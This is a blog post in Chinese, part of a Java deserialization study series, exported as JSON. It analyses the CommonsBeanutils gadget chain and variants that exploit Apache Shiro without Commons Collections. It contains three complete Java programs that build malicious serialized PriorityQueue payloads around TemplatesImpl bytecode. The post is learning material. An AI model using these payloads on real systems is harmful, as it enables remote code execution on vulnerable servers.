{"title":"Java反序列化7笔记","uid":"12aa89fe66392175592eb0eacb1d89b4","slug":"Java反序列化7笔记","date":"2022-09-16T11:41:44.000Z","updated":"2022-09-16T12:15:51.820Z","comments":true,"path":"api/articles/Java反序列化7笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈17</p>\n<p><a href=\"https://t.zsxq.com/067qjIa6Y\">https://t.zsxq.com/067qjIa6Y</a></p>\n<p>廖雪峰老师的JavaBean教程：</p>\n<p><a href=\"https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680\">https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680</a></p>\n<h1 id=\"CommonsBeanutils-：\"><a href=\"#CommonsBeanutils-：\" class=\"headerlink\" title=\"CommonsBeanutils ：\"></a>CommonsBeanutils ：</h1><p>Apache  CommonsBeanutils提供了对普通Java类对象(JavaBean)的一些操作方法</p>\n<p>CommonsBeanutils有一个静态方法 PropertyUtils.getProperty，可以让使用者调用任意JavaBean的getter方法</p>\n<p>同时还能递归使用，调用a对象的属性b的属性c</p>\n<p>PropertyUtils.getProperty(a, “b.c”);  </p>\n<p>在CommonsBeanutils中存在实现 java.util.Comparator接口的类</p>\n<p>org.apache.commons.beanutils.BeanComparator  </p>\n<p>其compare方法，当this.property为空则会进行直接进行比较。如果不为空，则用 PropertyUtils.getProperty分别获取两个对象的this.property属性，并比较属性值</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/15.PNG\"></p>\n<p>PropertyUtils.getProperty可以调用任意JavaBean的getter方法，而在TemplatesImpl利用链的第一环，TemplatesImpl#getOutputProperties()就是getter方法，这个方法在内部调用了TemplatesImpl#newTransformer() ，这被我们用来执行恶意字节码。</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/16.PNG\"></p>\n<p>所以， PropertyUtils.getProperty( o1, property ) 这段代码，当o1是一个 TemplatesImpl 对象，而 property 的值为 outputProperties 时，将会自动调用getter，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。  </p>\n<p>同样先创建TemplatesImpl对象，之后实例化BeanComparator，当其构造函数为空，默认的property就是空</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">final BeanComparator comparator &#x3D; new BeanComparator();  </code></pre>\n\n<p>之后使用实例化PriorityQueue对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">final PriorityQueue queue &#x3D; new PriorityQueue(2, comparator); \n\n&#x2F;&#x2F; stub data for replacement later \n\nqueue.add(1); \n\nqueue.add(1);   </code></pre>\n\n<p>之后使用反射将property的值设置为恶意的outputProperties，再将添加的1替换为恶意的TemplatesImpl对象。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); \n\nsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);  </code></pre>\n\n\n\n<h2 id=\"完整代码：\"><a href=\"#完整代码：\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\n\npublic class CommonsBeanutils1 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator();\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(1);\n\t\tqueue.add(1);\n\t\t\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n&#x2F;&#x2F;\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n\n</code></pre>\n\n\n\n<h3 id=\"注意：\"><a href=\"#注意：\" class=\"headerlink\" title=\"注意：\"></a>注意：</h3><p>这样会报错，其不会反序列化</p>\n<p>Exception in thread “main” java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory</p>\n<p>查资料说是classpath有问题，可以添加插件commons-logging.jar解决问题</p>\n<p><a href=\"https://blog.csdn.net/weixin_44226789/article/details/105836908\">https://blog.csdn.net/weixin_44226789/article/details/105836908</a></p>\n<p>之后就可以正常反序列化执行代码，这个在web项目中会添加，所以不会影响实战效果</p>\n<p>相比于ysoserial里的CommonsBeanutils1利用链，漫谈的利用链去掉了对 java.math.BigInteger 的 使用，因为ysoserial为了兼容 property=lowestSetBit ，但实际上将 property 设置为null即可。  </p>\n<h1 id=\"shiro利用难点：\"><a href=\"#shiro利用难点：\" class=\"headerlink\" title=\"shiro利用难点：\"></a>shiro利用难点：</h1><p>这里讨论的是当shiro没有使用CC依赖的时候如何反序列化，在没有使用CC时，会默认使用CB依赖，这时使用CB链的payload</p>\n<p>这样会报错， serialVersionUID 不一致，要注意序列化时的CB版本需要跟shiro的CB版本一致才行</p>\n<p>之后还报错，无法找到 org.apache.commons.collections.comparators.ComparableComparator  </p>\n<p>只是版本相同还不行，还是需要依赖CC链的反序列化</p>\n<p>CB本身依赖CC，但是CB的依赖不全，所以，使用CB不会导致出现问题，但是在反序列化时依赖没有的CC就会出现问题</p>\n<h2 id=\"org-apache-commons-collections-comparators-ComparableComparator\"><a href=\"#org-apache-commons-collections-comparators-ComparableComparator\" class=\"headerlink\" title=\"org.apache.commons.collections.comparators.ComparableComparator\"></a>org.apache.commons.collections.comparators.ComparableComparator</h2><p>在BeanComparator类的构造函数中，没有显示传入Comparator时默认使用，comparableComparator，所以反序列化时需要这个类</p>\n<p>前面使用CB链发现反序列化时还是需要CC依赖，现在找不需要CC依赖的，或者说是替代comparableComparator类的，需要以下条件：</p>\n<ol>\n<li>实现 java.util.Comparator 接口 </li>\n<li>实现 java.io.Serializable 接口 </li>\n<li>Java、shiro或commons-beanutils自带，且兼容性强  </li>\n</ol>\n<h2 id=\"java-lang-String-CaseInsensitiveComparator\"><a href=\"#java-lang-String-CaseInsensitiveComparator\" class=\"headerlink\" title=\"java.lang.String$CaseInsensitiveComparator\"></a>java.lang.String$CaseInsensitiveComparator</h2><p>这个类是java.lang.String类下的一个内部的私有类，实现了comparator和Serializable，位于Java核心代码中，兼容性强</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/18.PNG\"></p>\n<p>通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：  </p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">final BeanComparator comparator &#x3D; new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); </code></pre>\n\n<p>原来实例化 BeanComparator，直接默认的CaseInsensitiveComparator，这次使用String.CASE_INSENSITIVE_ORDER获取CaseInsensitiveComparator来实例化BeanComparator，就比以前多加一个Compare参数</p>\n<h3 id=\"封装完整代码：\"><a href=\"#封装完整代码：\" class=\"headerlink\" title=\"封装完整代码：\"></a>封装完整代码：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.beanutils.BeanComparator;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tString.CASE_INSENSITIVE_ORDER);\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\treturn barr.toByteArray();\n\t\t&#125;\n\n&#125;\n</code></pre>\n\n\n\n<h2 id=\"java-util-Collections-ReverseComparator\"><a href=\"#java-util-Collections-ReverseComparator\" class=\"headerlink\" title=\"java.util.Collections$ReverseComparator\"></a>java.util.Collections$ReverseComparator</h2><p>漫谈提到可用，另一个shiro无依赖的利用</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/17.PNG\"></p>\n<p>原理通前面CaseInsensitiveComparator 相同，所以找一下代码，看一下如何利用</p>\n<p>ReverseComparator是java.util.Collections的内部保护类，它同样实现了Comparator和Serializable接口</p>\n<p>接下来要考虑的就是如何获取ReverseComparator来作为BeanComparator 的comparator</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/19.PNG\"></p>\n<p>同前面一样，通过Collections.reverseOrder可以获取一个ReverseComparator对象</p>\n<p>可以生成序列化数据，在本地测试一下</p>\n<p>成功弹出计算器，调式一下，流程没有错</p>\n<h3 id=\"本地测试完整代码：\"><a href=\"#本地测试完整代码：\" class=\"headerlink\" title=\"本地测试完整代码：\"></a>本地测试完整代码：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.CommonCollections4Test;\nimport java.util.Collections;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro1Test &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tCollections.reverseOrder());\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n</code></pre>\n\n","text":" 参考资料：p牛 Java安全漫谈17 https://t.zsxq.com/067qjIa6Y 廖雪峰老师的JavaBean教程： https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680 Common...","link":"","photos":[],"count_time":{"symbolsCount":"9.2k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":14,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CommonsBeanutils-%EF%BC%9A\"><span class=\"toc-text\">CommonsBeanutils ：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">完整代码：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E6%84%8F%EF%BC%9A\"><span class=\"toc-text\">注意：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#shiro%E5%88%A9%E7%94%A8%E9%9A%BE%E7%82%B9%EF%BC%9A\"><span class=\"toc-text\">shiro利用难点：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#org-apache-commons-collections-comparators-ComparableComparator\"><span class=\"toc-text\">org.apache.commons.collections.comparators.ComparableComparator</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#java-lang-String-CaseInsensitiveComparator\"><span class=\"toc-text\">java.lang.String$CaseInsensitiveComparator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B0%81%E8%A3%85%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">封装完整代码：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#java-util-Collections-ReverseComparator\"><span class=\"toc-text\">java.util.Collections$ReverseComparator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">本地测试完整代码：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化8笔记","uid":"4246a945c68e3de6ca09de0bdac9f5e2","slug":"Java反序列化8笔记","date":"2022-09-16T11:41:51.000Z","updated":"2022-09-16T12:27:09.094Z","comments":true,"path":"api/articles/Java反序列化8笔记.json","keywords":null,"cover":[],"text":" 参考文章：p牛Java安全漫谈 18 https://t.zsxq.com/06RBYz7un p牛 https://t.zsxq.com/063Zz3B2F JDK7u21反序列化漏洞分析笔记 https://xz.aliyun.com/t/9704#toc-10 JDK7u...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":14,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化6笔记","uid":"4a2c67097cc575b58a19c08f5d864189","slug":"Java反序列化6笔记","date":"2022-09-16T11:41:20.000Z","updated":"2022-09-16T12:05:26.316Z","comments":true,"path":"api/articles/Java反序列化6笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈16 https://t.zsxq.com/06JeeqbMN Java Things https://github.com/phith0n/JavaThings PriorityQueue源码分析 https://www.cnblogs.com...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":14,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}